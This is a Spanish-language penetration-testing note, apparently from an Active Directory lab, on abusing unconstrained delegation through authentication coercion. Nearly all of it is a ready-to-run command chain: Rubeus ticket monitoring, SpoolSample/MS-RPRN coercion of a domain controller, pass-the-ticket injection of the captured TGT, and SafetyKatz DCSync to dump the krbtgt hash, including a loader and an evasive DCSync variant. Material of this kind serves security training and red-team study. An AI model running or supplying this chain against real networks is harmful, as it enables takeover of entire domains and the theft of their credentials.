## Unconstrained Delegation - Coercion

Tags: #AD #Unconstrained_Delegation 

- Ciertos servicios y protocolos de Microsoft permiten que cualquier usuario autenticado fuerce a una máquina a conectarse a una segunda máquina.
- A partir de enero de 2025, los siguientes protocolos y servicios pueden utilizarse para coerción:

| Protocol | Service        | Default on Server OS      | Ports Required |
| -------- | -------------- | ------------------------- | -------------- |
| MS-RPRN  | Print Spooler  | Yes                       | 445 (SMB)      |
| MS-WSP   | Windows Search | No (Default on Client OS) | 445 (SMB)      |
| MS-DFSNM | DFS Namespaces | No                        | 445 (SMB)      |
Nota: MS-DFSNM suele ser detectado por soluciones como MDI.

```bash 
Pasos:
1 Identificar el servidor con Unconstrained 
2 Acceder al servidor identificado 
3 Modo escucha de LOS TICKETS
4 Forzar la autenticación con el AD server y capturar la CUENTA DE MAQUINA 
5 Utilizar el ticket CON ALTOS PRIVILEGIOS EN EL DOMINIO DCSYNC ATTACK
```

```powershell
! Usuario: Usuario de dominio

❯ Find-PSRemotingLocalAdminAccess -Domain domain1.local
# Enumerar equipos del dominio donde el usuario actual tiene acceso de administrador local vía PS Remoting — identifica máquinas para movimiento lateral directo.
``` 

```powershell 
! Usuario: Administrador local del servidor con Unconstrained Delegation
Paso 1:
❯ Rubeus.exe monitor /interval:5 /nowrap
❯ .\Loader.exe -path C:\AD\Rubeus.exe -args monitor /targetuser:DCORP-DC$ /interval:5 /nowrap
# Monitorear en tiempo real cada 5 segundos los nuevos tickets Kerberos en memoria — captura automáticamente el TGT del DC cuando se conecte al servidor.
# Se captura la cuenta de maquina 'DC$'


! Usuario: Usuario de dominio (desde la máquina del atacante)
Paso 2:
❯ .\MS-RPRN.exe \\dcorp-dc.domain1.local \\dcorp-appsrv.domain1.local
# Forzar al DC a autenticarse contra el servidor con Unconstrained Delegation abusando del PrintSpooler (SpoolSample) — provoca que el DC envíe su TGT al servidor monitoreado con Rubeus. 

❯ .\SpoolSample.exe \\dcorp-dc.domain1.local \\dcorp-appsrv.domain1.local
```

```powershell 
! Usuario: Usuario de dominio (desde la máquina del atacante)

Paso 3:
❯ Rubeus.exe ptt /ticket:<base64>
❯ .\Loader.exe -path C:\AD\Rubeus.exe -args ptt /ticket:<base64>
# Inyectar el TGT del DC capturado en formato base64 en la sesión actual — usar el ticket obtenido del monitor de Rubeus, eliminando espacios extra antes de pegarlo.

❯ klist    # Mirar los tickets actuales en la sesión 

Paso 4: 
❯ SafetyKatz.exe "lsadump::dcsync /user:dcorp\krbtgt"
❯ .\Loader.exe -path C:\AD\SafetyKatz.exe -args "lsadump::Evasive-dcsync /user:dcorp\krbtgt" "exit"
# Ejecutar DCSync con el TGT del DC inyectado para volcar el hash de krbtgt — completa la cadena de Unconstrained Delegation → captura de TGT → DCSync.
```

![](Pasted%20image%2020260420180816.png)
